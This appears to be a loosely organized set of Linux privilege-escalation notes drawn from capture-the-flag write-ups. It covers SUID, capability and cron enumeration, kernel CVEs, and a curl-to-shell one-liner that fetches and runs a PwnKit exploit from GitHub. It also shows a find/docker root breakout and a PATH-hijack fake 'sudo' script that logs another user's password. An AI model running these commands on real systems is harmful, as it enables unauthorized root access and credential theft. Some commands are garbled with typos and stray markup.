# Priviledge Escalation
sudo -l
Since sudo -l is a dead end, you should look for other Privilege Escalation vectors:

- **Find SUID binaries:**  
    Files that execute with the file owner's permissions (often root).
    ```
    find / -perm -u=s -type f 2>/dev/null
    ```
- Discover files that have user cage as a characteristic.
 ```
 find / -type f -user** cage **2>/dev/null
 ```
- **Check Capabilities:**  
    Linux capabilities can sometimes be abused.
    ```
    getcap -r / 2>/dev/null
    ```
- **Check for Writable Files:**  
    Look for configuration files or scripts you can modify.
    ```
    find /etc -maxdepth 2 -writable 2>/dev/null
    ```
- **Check Cron Jobs:**  
    Look for automated tasks you might be able to influence.
    ```
    cat /etc/crontab
    ls -la /etc/cron.*
    ```
# Analyze SUID Binaries
/usr/bin/pkexec listed as SUID. This is a very common vector for privilege escalation via **CVE-2021-4034 (PwnKit)**, especially if the system hasn't been patched since January 2022.

**Action:** Check if pkexec is vulnerable.  
```
pkexec --version
```
### Check System & Kernel Version
**Action:** Run these commands to identify the architecture and kernel version:
```
uname -a
cat /etc/os-release
```
- **Dirty Pipe (CVE-2022-0847):** Linux kernel 5.8 or later.
- **Dirty COW (CVE-2016-5195):** Older kernels (2.x - 4.x).
- **OverlayFS (CVE-2021-3493):** Ubuntu specific kernels.
### Enumerate Processes (Cron & Services)
**Action:** Look for processes running as root. You are looking for things like database servers, web servers, or custom scripts.
```
ps -ef | grep root
```
Look specifically for scripts running out of /opt, /home, or /var/www.
### Check Internal Ports
```
ss -tunlp 
# OR if ss is missing 
netstat -antup
```
# File Check
.bash_history
crontab  ```
/etc/crontab, /etc/environment - common cron locations
etc/systemd/system - systemd, a software suite for system and service management on Linux_ built to unify service configuration and behavior across Linux distributions.
iptables - blocked ports on firewall
/var/log/auth.log - It contains data on user logins, failed and successful SSH attempts, `sudo` usage, and user/group modifications. It is essential for monitoring security and auditing system access.

use "find" command with [ctime flag](https://bytexd.com/how-to-use-find-with-atime-ctime-mtime-amin-cmin-mmin) to detect persistence

stat  
- /opt/dev/.git/config - find a password
 - **/home**: This is where user folders are usually stored. Inside these folders, we might find files that contain important information, like the **user flag**.
- **/opt/**: Sometimes used for installing custom applications.
- **/var/backups/**: May contain backup files of configurations.
- **/usr/local/**: Often used for custom software installations.
Findings of Contents of the .git Folder:

- **branches**: This folder usually contains information about branches in the Git repository.
- **config**: This file contains configuration details for the Git repository, such as repository URL and user settings.
- **COMMIT_EDITMSG**: This file contains the message from the last commit made to the repository.
- **description**: A brief description of the repository.
- **HEAD**: Indicates the current branch that is checked out.
- **hooks**: Contains scripts that can be executed at certain points in the Git process (e.g., before a commit).
- **index**: Keeps track of changes in the repository.
- **info**: Usually contains additional information about the repository.
- **logs**: Records changes made to the branches.
- **objects**: Stores all the Git objects, such as the contents of files and their history.
- **refs**: Contains references to branches and tags.
1. Checking the latest commit message

This file contains the most recent commit message, which might provide clues about changes or sensitive information.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*KTXPfbvZVu96CCqbxnU2YQ.png)

cat COMMIT_EDITMSG

### Path 3: Hunting for SUID Binaries

If sudo doesn't work, you need to find a "leak" in the system's security. Look for files with the **SUID bit** set. These are programs that run with root privileges even when a normal user executes them.

1. **Find SUID files:
    ```
    find / -perm -4000 -type f 2>/dev/null
    ```
    
2. **Look for "weird" entries:**  
    If you see things like /usr/bin/python, /usr/bin/vim, or /usr/bin/bash in that list, you can use them to "break out" into a root shell.
    - Example: If find has the SUID bit, you can run: find . -exec /bin/sh -p \; -quit to get root.
### 2. Check for "PwnKit" (CVE-2021-4034)

This is the most famous exploit for Ubuntu 20.04. It exploits the pkexec binary. Even if you didn't see it in your find list, check if it exists:

```
ls -l /usr/bin/pkexec
```

If it exists and has an s in the permissions (e.g., -rwsr-xr-x), you can likely get root in seconds.  
**The Test:** There are many one-liner exploits for this. If the machine has internet access, you can try:

```
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
```

(If no internet, you'll have to compile a C script locally, which is common in CTFs.)

### Check Frank's Groups

Sometimes your user belongs to a group that has special powers (like lxd, docker, or disk).

codeBash

```
id
```

- If you see **lxd**: You can become root easily by mounting the root filesystem into a container.
- If you see **docker**: You can run docker run -v /:/mnt -it alpine to access the whole hard drive as root.
## Hijack

Another hint from the problem is hijack, so I looked into the problem of path hijack and found that we should be able to create a script called sudo and prepend it to the PATH of the user frank. This way, when the ssh user will run sudo they will run the sudo script that we made.

  
mkdir -p /home/frank/.local/bin/  
vim /home/frank/.local/bin/sudo

Then in the sudo script we add

#!/bin/bash  
read password  
echo $password >> /home/frank/password.txt

Then we have to add it to `.bashrc`

chmod +x /home/frank/.local/bin/sudo  
vim /home/frank/.bashrc

And we put the export at the start of the file (to avoid exits)

export PATH=/home/frank/.local/bin

Then we have to wait and we can display the password using

cat password.txt

Then we can use the `/bin/sudo` binary to run as root. Remember that the `sudo` binary is now our script so we have to specfy the absolute path :)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*hpOO3Tyu4EkiuCKR3y5-aA.png)

Then simply `/bin/sudo bash` and then `cat /root/flag.txt`.